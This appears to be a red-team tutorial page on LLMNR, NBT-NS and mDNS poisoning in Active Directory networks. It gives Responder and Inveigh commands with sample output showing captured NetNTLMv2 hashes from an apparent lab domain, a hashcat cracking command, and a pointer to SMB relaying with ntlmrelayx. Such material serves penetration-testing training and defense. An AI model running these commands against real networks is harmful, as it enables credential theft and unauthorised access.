---
title: LLMNR/NBT-NS/mDNS Poisoning
description: Poison multicast name resolution protocols for NetNTLM hashes
categories: [Active Directory]
tags: [Active Direcotory, Initial Access, LLMNR, NTLM Authentication]
weight: 2
---

LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (Multicast DNS) are protocols and services utilized by Windows as alternative methods of host identification when DNS fails to resolve a hostname. These protocols will ask all other machines on the local network for the correct address, and **ANY host** on the network can reply and provide a response.

LLMNR/NBT-NS/mDNS Poisoning is an effective way to obtain an initial set of credentials when we have a local network address in a network running Active Directory.

## Example Attack Procedure
As the attacker, we may respond to any LLMNR/NBT-NS/mDNS query we receive with the IP address of a machine we control. We can then obtain the NetNTLMv2 password hash of the connecting user when it attempts to authenticate to our machine. Below is a quick example of this process:
1. A host attempts to connect to `print01.contoso.com`, but accidentally types in `printer01.contoson.com`.
2. The DNS server responds, stating the host is unknown.
3. The host then broadcasts, via LLMNR, NBT-NS, or mDNS asking if any hosts on the network knows the IP address for `printer01`.
4. The attacker machine responds that it is the `printer01` machine that the victim host is looking for.
5. The victim host believes this reply and sends an authentication request to the attacker with a username and NetNTLMv2 password hash.
6. The attacker responds with authentication failure to terminate the connection with the victim, and takes the NetNTLMv2 password hash for either offline cracking or for SMB relay attack.

The only requirement for this attack is that we can respond to the LLMNR/NBT-NS/mDNS request from an IP address within the same subnet as the victim.

## Linux Exploitation
On Linux, we may use [Responder](https://github.com/lgandx/Responder) to poison LLMNR/NBT-NS/mDNS requests. The only required parameter is the name of the listening interface (`-I`).
```bash
sudo responder -I <interface>
```

To passively observe LLMNR/NBT-NS/mDNS requests without responding to them, we may turn on analysis mode with `-A`.
```bash
sudo responder -I <interface> -A
```

A popular flag for Responder is `-wf`, which combines `-w`, the WPAD Rogue Proxy, and `-f`, fingerprinting of connecting hosts. The `-v` flag can be used to increase output verbosity.
```bash
sudo responder -I <interactive> -wf
```

When a LLMNR request is received, Responder responds with the IP address of our attacker machine, and the client attempts to authenticate to us via NTLM authenticaiton by sending us their NetNTLMv2 password hash.
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo responder -I eth0
[...]
[SMB] NTLMv2-SSP Client   : 10.10.0.3
[SMB] NTLMv2-SSP Username : GUNDAM\amuro.ray
[SMB] NTLMv2-SSP Hash     : amuro.ray::GUNDAM:a3b63d7ddbe6ba7a:3AD368AA88D65EDDBD3EF78620E6C30F:01010000000000000091F32BB296DC015AA351A97183FC670000000002000800340057004E00350001001E00570049004E002D004F004100340033005500300043004E0038004800430004003400570049004E002D004F004100340033005500300043004E003800480043002E00340057004E0035002E004C004F00430041004C0003001400340057004E0035002E004C004F00430041004C0005001400340057004E0035002E004C004F00430041004C00070008000091F32BB296DC01060004000200000008003000300000000000000000000000003000008949D311EBD21F7E16A9C4A322E62635FFEF4C00A8D42DBCC20D9DAF11A745880A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
Responder can be configured inside its configuration file (`/usr/share/responder/Responder.conf`). Servers and poisoners for different protocols can turned on or off.
```shell-session
╭─brian@rx-93-nu ~
╰─$ cat /usr/share/responder/Responder.conf
[Responder Core]

; Poisoners to start
MDNS  = On
LLMNR = On
NBTNS = On

; Servers to start
SQL      = On
SMB      = On
QUIC     = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = Off
HTTPS    = Off
DNS      = On
LDAP     = On
DCERPC   = On
WINRM    = On
SNMP     = On
MQTT     = On
[...]
```

## Windows Exploitation
If we have a Windows machine on the same network as the Active Directory domain we are targetting, we may use [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to respond to poison the LLMNR/NBT-NS/mDNS requests. The Windows machine does not have to be joined to the target domain for this to work, but SMB needs to be enabled. Inveigh is available in both PowerShell and C# versions.
```shell-session
PS C:\Users\Amuro.Ray\Desktop\inveigh> .\Inveigh.exe -LLMNR Y -MDNS Y -NBNS Y
[*] Inveigh 2.0.12 [Started 2026-03-23T13:01:49 | PID 10628]
[+] Packet Sniffer Addresses [IP 10.10.0.4 | IPv6 fe80::8382:e25f:cd70:d4ba%7]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 10.10.0.4 | IPv6 fe80::8382:e25f:cd70:d4ba%7]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[+] MDNS Packet Sniffer [Questions QU:QM | Type A]
[+] NBNS Packet Sniffer [Types 00:20]
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Users\Amuro.Ray\Desktop\inveigh]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
```
We can press `ESC` to enter interactive mode. Inveigh will collect the NetNTLMv2 hashes in the background while providing us various commands inside its help memu
```shell-session
C(0:0) NTLMv1(0:0) NTLMv2(0:0)> HELP
========================================== Inveigh Console Commands ==========================================

Command                           Description
==============================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET REPLYTOQUERIES              | get ReplyToQueries parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
GET IGNOREQUERIES               | get IgnoreQueries parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```
Eventually, when capture hashes, we may use `GET NTLMV2UNIQUE` to get a list of unique NetNTLMv2 hashes we have captured so far.
```shell-session
C(0:0) NTLMv1(0:0) NTLMv2(2:2)> GET NTLMV2UNIQUE
================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
Administrator::GUNDAM:2AA673CB2F0DF970:09A823F4D5F9B3ECF3B21537DACF9AC2:01010000000000001D9D06D210BBDC015BF5A4673A50F9890000000002000C00470055004E00440041004D0001001800520058002D0030002D0055004E00490043004F0052004E0004001800470055004E00440041004D002E006C006F00630061006C0003003200520058002D0030002D0055004E00490043004F0052004E002E00470055004E00440041004D002E006C006F00630061006C0005001800470055004E00440041004D002E006C006F00630061006C00070008001D9D06D210BBDC0106000400020000000800300030000000000000000000000000300000CC1C098C242B47DB3375C207523DA32D9F9B4788299A963FBE4BA82AE33726090000000000000000
Char.Aznable::GUNDAM:72F4BBD4D260A6A8:576065528ECE8B98927DFF046A7309D6:01010000000000004102B01011BBDC012CEE151E923421ED0000000002000C00470055004E00440041004D0001001800520058002D0030002D0055004E00490043004F0052004E0004001800470055004E00440041004D002E006C006F00630061006C0003003200520058002D0030002D0055004E00490043004F0052004E002E00470055004E00440041004D002E006C006F00630061006C0005001800470055004E00440041004D002E006C006F00630061006C00070008004102B01011BBDC0106000400020000000800300030000000000000000100000000200000CC1C098C242B47DB3375C207523DA32D9F9B4788299A963FBE4BA82AE33726090000000000000000
```

## NetNTLMv2 Hash Cracking
We may take the NetNTLMv2 hash for offline cracking with Hashcat using mode 5600 after saving the hash to a file to recover the plaintext.
```bash
hashcat -m 5600 -O <hash_file> <wordlist>
```

## Combining LLMNR Poisoning with SMB Relay Attack
Instead of asking the user for NTLM authentication, we could instead relay authentication, using `ntlmrelayx` from Impacket, between the user and other target hosts on the network. The only requirements are:
- SMB signing is disabled on victim and target hosts.
- The user is a local administrator on one or more target hosts.

Check on the article on [SMB relay attacks]({{< relref "/docs/active_directory/initial_access/smb_relay">}}) for more details.
